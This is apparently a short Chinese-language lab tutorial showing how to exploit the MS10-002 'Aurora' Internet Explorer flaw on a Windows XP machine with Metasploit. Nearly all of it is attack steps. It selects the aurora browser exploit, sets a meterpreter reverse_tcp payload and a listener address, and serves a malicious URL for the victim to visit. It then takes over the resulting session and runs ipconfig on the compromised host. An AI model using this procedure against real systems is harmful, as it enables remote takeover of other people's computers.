一、漏洞介绍

ms10\_002漏洞，它是IE浏览器漏洞，也称“极光漏洞”，可以通过该漏洞获取目标主机的控制权。

  

二、攻击过程（目标主机是xp系统）

1、启动msf，搜索ms10\_002

search ms10\_002

![](../Images/bac9d2b75eee81a9545f4e1677c36ee1.png)

2、选择模块

use exploit/windows/browser/ms10\_002\_aurora

3、设置payload

set payload windows/meterpreter/reverse\_tcp

![](../Images/0df20fae8d1fe09a4cd1de32157cdfc1.png)

4、查看需要设置的参数

show options

![](../Images/fdecf5f424d9b86909dbfc85ca43ae4c.png)

5、设置监听的ip地址

set LHOST 192.168.1.133

![](../Images/363e49e1fb6349655acf02c73df2ca78.png)

6、攻击run，等待目标机连接

![](../Images/8fc6f517347cafb1ed369c9ac9eb2d04.png)

7、只要目标主机访问该连接，我们就可以获取该主机的控制权限

http://192.168.1.133:8080/cZQri76QWY9OhwC

![](../Images/5d0f2547fd003c2316f4fa9ee0e28fc6.png)

  

8、指定要控制的目标主机：sessions -i 1

![](../Images/10b559a992fd697395234bce3bad0acf.png)

9、输入ipconfig，获取目标主机相关信息

![](../Images/3dad882216b8986e00035a9068fabfb8.png)
